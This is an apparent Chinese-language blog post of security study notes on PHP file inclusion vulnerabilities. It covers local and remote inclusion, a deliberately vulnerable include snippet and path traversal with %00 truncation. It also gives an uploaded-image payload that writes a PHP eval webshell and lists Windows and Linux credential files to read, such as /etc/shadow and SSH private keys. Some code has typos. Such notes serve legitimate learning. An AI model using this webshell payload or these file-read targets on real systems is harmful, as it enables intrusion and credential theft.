---
layout:     post
title:      Web笔记（八）文件包含漏洞
subtitle:   这个系列是整理学习安全的笔记，包括Web和PWN的一些知识。本章是学习文件包含漏洞，记录的一些笔记。
date:       2020-12-02
author:     HouKC
header-img: img/post-bg-rwd.jpg
catalog:    true
tags:
    - CTF
    - web
    - 网络安全
    - 学习笔记
    - 文件包含
---



## 0x00  文件包含漏洞简介

程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这种文件调用的过程一般被称为文件包含。

程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。

几乎所有脚本语言都会提供文件包含功能，但文件包含漏洞在PHP Web Application中居多，而在JSP、ASP、ASP.NET程序中却非常少，甚至没有，这是有些语言设计的弊端。

在PHP中经常出现包含漏洞，但这并不意味着其他语言不存在。



## 0x01 常见文件包含函数

- include()    执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行。

- require()    只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本。

- include_once()和require_once()    若文件中代码已被包含则不会再次包含。



## 0x02 利用条件

- 程序用include()等文件包含函数通过动态变量的范式引入需要包含的文件

- 用户能够控制该动态变量



## 0x03 漏洞危害

- 执行任意代码

- 包含恶意文件控制网站
- 甚至控制服务器



## 0x04 漏洞分类

#### 1. 本地文件包含

可以包含本地文件，在条件允许时甚至能执行代码。

- 上传图片马，然后包含
- 读敏感文件，读PHP文件
- 包含日志文件getshell
- 包含/proc/self/envion文件getshell
- 包含data:或php://input等伪协议
- 若有phpinfo则可以包含临时文件

#### 2. 远程文件包含

可以直接执行任意代码。

```
http://xxx.com/xxx.php?file=http://xxx.com/x.php
```

**远程文件包含要保证php.ini中allow_url_fopen和allow_url_include要为On**



## 0x05 漏洞挖掘

	* 
通过白盒代码审计
* 
黑盒工具挖掘
* 
  AWVS、Appscan、Burpsuite
* 
  w3af



## 0x06 本地包含漏洞

#### 1. 文件包含漏洞利用的条件

- inlcude()等函数通过动态变量的方式引入需要包含的文件
- 用户能控制该动态变量

```php
<?php
$test=$_GET['c'];
include($test);
?>
```

保存为include.php，在同一个目录下创建test.txt内容为`<?php phpinfo()?>`

然后访问测试：http://127.0.0.1/test/include.php?c=test.txt

#### 2. 本地包含漏洞注意事项

	* 
相对路径：../../../../etc/password
* 
%00截断包含（PHP<5.3.4）（magic_quotes_gpc=off才可以，否则%00会被转义）

```php
<?php
include $_GET['x'].".php";
echo $_GGET['x'].".php";
?>
```



#### 0x07 利用技巧
首先上传图片马，马包含以下代码：

```php
<?fputs(fopen("shell.php"),"w"),"<?php eval($_POST[x]);?>"?>
```

上传后图片路径为假设为/uploadfile/x.jpg，当访问http://127.0.0.1/xx.php?page=uploadfile/x.jpg时，将会在文件夹下生成shell.php，内容为

```php
<?php eval($_POST[x]);?>
```



## 0x08 读敏感文件

#### 1. Windows

- C:\boot.ini  //查看系统版本
- C:\Windows\System32\inetsrv\MetaBase.xml  //IIS配置文件
- C:\Windows\repair\sam  //存储系统初次安装的密码
- C:\Program Files\mysql\my.ini  //Mysql配置
- C:\Program Files\mysql\data\mysql\user.MYD  //Mysql root
- C:\Windows\php.ini  //php配置信息
- C:\Windows\my.ini  //Mysql配置信息

#### 2. Linux

- /root/.ssh/authorized_keys
- /root/.ssh/id_rsa
- /root/.ssh/id_rsa.keystore
- /root/.ssh/known_hosts
- /etc/passwd
- /etc/shadow
- /etc/my.cnf
- /etc/httpd/conf/httpd.conf
- /root/.bash_history
- /root/.mysql_history
- /proc/self/fd/fd[0-9]*   （文件标识符）
- /proc/mounts
- /proc/config.gz



